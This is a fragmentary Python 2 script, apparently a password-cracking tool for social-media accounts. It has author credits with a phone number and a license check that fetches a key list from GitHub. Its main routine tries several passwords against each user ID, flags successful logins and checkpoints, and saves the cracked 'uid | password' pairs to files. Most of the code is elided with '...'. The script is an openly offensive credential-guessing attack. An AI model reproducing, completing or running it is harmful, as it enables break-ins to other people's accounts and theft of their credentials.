...
\033[1;97m➣ Author : Tiie

\033[1;97m➣ Github : Tech-Tii6

\033[1;97m➣ WP  : +27812145320
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/Black-501/Crack/main/Server.txt').text
    ...
    if to in r:
        ...
        os.system('xdg-open https://wa.me/0812145320')
...
def a_s():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\033[1;92m[TIIE_OK] ' + uid + ' | ' + pass1

                ok = open('/sdcard/ids/TIIE_OK.txt', 'a')
                ...
                print '\033[1;97m[TIIE_CP] ' + uid + ' | ' + pass1

                cp = open('Tiex_CP.txt', 'a')
                ...
                if 'loc' in q:
                    ...
                    print '\033[1;92m[TIIE_OK] ' + uid + ' | ' + pass2
                    ...
                    print '\033[1;97m[TIIE_CP] ' + uid + ' | ' + pass2
                    ...
                    if 'loc' in q:
                        ...
                        print '\033[1;92m[TIIE_OK] ' + uid + ' | ' + pass3
                        ...
                        print '\033[1;97m[TIIE_CP] ' + uid + ' | ' + pass3
                        ...
                        if 'loc' in q:
                            ...
                            print '\033[1;92m[TIIE_OK] ' + uid + ' | ' + pass4
                            ...
                            print '\033[1;97m[TIIE_CP]' + uid + ' | ' + pass4
    ...
    print ' \033[1;92m [✔️]CRACKING DONE!
